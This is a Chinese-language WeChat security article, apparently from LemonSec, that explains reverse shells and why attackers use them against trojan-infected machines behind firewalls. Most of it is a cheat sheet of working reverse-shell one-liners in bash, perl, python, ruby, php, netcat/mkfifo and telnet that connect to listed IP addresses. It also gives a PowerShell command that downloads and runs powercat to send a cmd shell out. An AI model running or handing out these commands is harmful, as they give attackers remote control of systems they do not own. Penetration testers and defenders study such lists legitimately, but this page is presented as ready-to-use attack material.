> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/zuWixh1e6edKe74H5bIURw)

1.   关于反弹 shell
---------------

      就是控制端监听在某 TCP/UDP 端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell 与 telnet，ssh 等标准 shell 对应，本质上是网络概念的客户端与服务端的角色反转。  

2.   反弹 shell 的原因
-----------------

        通常用于被控端因防火墙受限、权限不足、端口被占用等情形

    假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web 服务，ssh，telnet 等等，都是正向连接。那么什么情况下正向连接不太好用了呢？

      1）某客户机中了你的网马，但是它在局域网内，你直接连接不了。

      2）它的 ip 会动态改变，你不能持续控制。

      3）由于防火墙等限制，对方机器只能发送请求，不能接收请求。

    4）对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。  

3. 反弹 shell 集锦
--------------

```
@bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
@/bin/bash -i > /dev/tcp/173.214.173.151/8080 0<&1 2>&1
@/bin/sh | nc 10.104.11.107 9007
 
@perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.104.11.107:9006");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
@perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.104.11.107:9009");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 
@python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('10.104.11.107',9013))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
 
@ruby -rsocket -e'f=TCPSocket.open("10.104.11.107",9009).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
@ruby -rsocket -e 'c=TCPSocket.new("10.104.11.107","9010");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.104.11.107","9011");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
     
@mknod backpipe p && telnet 173.214.173.151 8080 0backpipe
 
@php -r '$sock=fsockopen("10.104.11.107",9012);exec("/bin/sh -i <&3 >&3 2>&3");'
 
@rm -f /tmp/p; mknod /tmp/p p && nc 10.104.11.107 9008 0/tmp/  
@rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 
#本地监听两个端口,通过管道,一处输入,一处输出   
@nc 10.104.11.107 1234|/bin/sh|nc 10.104.11.107 9999
@shell.py
@shell.pl
@shell2.pl
 
1.perl -MIO -e '$p=fork;exit,if($p); $c=new IO::Socket::INET(PeerAddr,"10.104.11.107:9002");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
2.rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.104.11.107 9003 >/tmp/f
3.mknod backpipe p && telnet 10.104.11.107 9005 0backpipe
4.perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.104.11.107:9006");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
5./bin/sh | nc 10.104.11.107 9007
6.rm -f /tmp/p; mknod /tmp/p p && nc 10.104.11.107 9008 0/tmp/
7.ruby -rsocket -e 'c=TCPSocket.new("10.104.11.107","9010");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
8.ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.104.11.107","9011");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
9.python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('10.104.11.107',9013))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")
```

```
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 1.1.1.1 -p 443 -e cmd
```

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)

一如既往的学习，一如既往的整理，一如即往的分享。感谢支持![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7QVywL8iaGT0QBGpOwgD1IwN0z9JicTRvzvnsJicNRr2gRvJib6jKojzC5CJJsFPkEbZQJ999HrH5Gw/640?wx_fmt=png)  

“如侵权请私聊公众号删文”

****扫描关注 LemonSec****  

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icncXiavFRorU03O5AoZQYznLCnFJLs8RQbC9sltHYyicOu9uchegP88kUFsS8KjITnrQMfYp9g2vQfw/640?wx_fmt=png)

**觉得不错点个 **“赞”**、“在看” 哦****![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1YhlAJOGvAaVRV0ZSSnX46ibouOHe05icukBYibdJOiaOpO06ic5eb0EMW1yhjMNRe1ibu5HuNibCcrGsqw/640?wx_fmt=png)**